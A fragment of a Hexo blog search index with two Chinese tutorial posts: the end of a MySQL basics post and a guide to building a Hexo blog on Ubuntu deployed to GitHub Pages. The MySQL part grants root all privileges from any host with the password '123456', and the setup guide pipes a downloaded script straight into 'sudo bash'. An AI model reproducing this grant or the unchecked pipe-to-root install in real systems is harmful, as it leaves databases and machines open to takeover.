by '连接口令'； 赋给用户权限,权限被all privileges或all替代，表示赋给用户全部权限；数据库名.表名被*替代，表示赋给用户操作服务器上所有数据库所有表的权限；用户地址可以使ip地址、机器名、域名，也可以用%表示从任何地址连接；连接口令不能为空，否则创建失败；后面可以加with grant option对象授权，权限传递（我也不懂，就是这么说的）例： GRANT ALL PRIVILEGES ON *.* TO 'root'@'%' IDENTIFIED BY '123456' WITH GRANT OPTION; flush privileges; #刷新系统权限表show variables like "secure_file_priv" #查看可写目录]]></content>
      <categories>
        <category>MySQL</category>
      </categories>
      <tags>
        <tag>MySQL基础</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Ubuntu+hexo+Github博客简单搭建流程]]></title>
    <url>%2F2017%2F08%2F25%2Fblog-step%2F</url>
    <content type="text"><![CDATA[自己博客的基本搭建流程，不包含主题的美化 搭建开始1、安装nodejs1234curl -sL https://deb.nodesource.com/setup_4.x | sudo -E bash -sudo apt-get install -y nodejsnode -v #检查版本v 4.4.5 2、安装git123apt-get install gitgit --version #检查版本git version 2.7.4 3、安装npm1apt-get install npm 4、使用npm安装hexo1npm install -g hexo-cli 5、创建一个博客文件夹，进入文件夹中1234hexo initnpm installhexo -v #此时博客已经创建成功hexo server #看看效果把（浏览器中输入：ip:4000，如果4000端口被占用，hexo server -p 其他端口） 6、创建一个github账户，新建一个和用户名对应的仓库，格式固定：用户名.github.io 7、修改站点配置文件_config.yml123456language: zh-Hans 设置成中文deploy: type: git repository: git@github.com:maplege/maplege.github.io.git branch: master message: '站点更新:&#123;&#123;now("YYYY-MM-DD HH:mm:ss")&#125;&#125;' 8、然后执行下面的命令1npm install hexo-deployer-git --save 9、生成SSH密钥123$ cd ~/. ssh #检查本机已存在的ssh密钥如果提示：No such file or directory 说明你是第一次使用git。ssh-keygen -t rsa -C "邮件地址" 然后连续3次回车，最终会生成一个文件在用户目录下，打开用户目录，找到.ssh\id_rsa.pub文件，记事本打开并复制里面的内容，打开你的github主页，进入个人设置 -&gt; Deploy keys -&gt; Add deploy key：将刚复制的内容粘贴到key那里，title随便填，保存。 10、进行git全局配置12git config --global user.email "you@example.com"git config --global user.name "Your Name" 11、上传到github空间中123hexo cleanhexo ghexo d 至此，博客搭建完毕]]></content>
      <categories>
        <category>博客</category>
      </categories>
      <tags>
        <tag>博客搭建</tag>
      </tags>
  </entry>
</search>
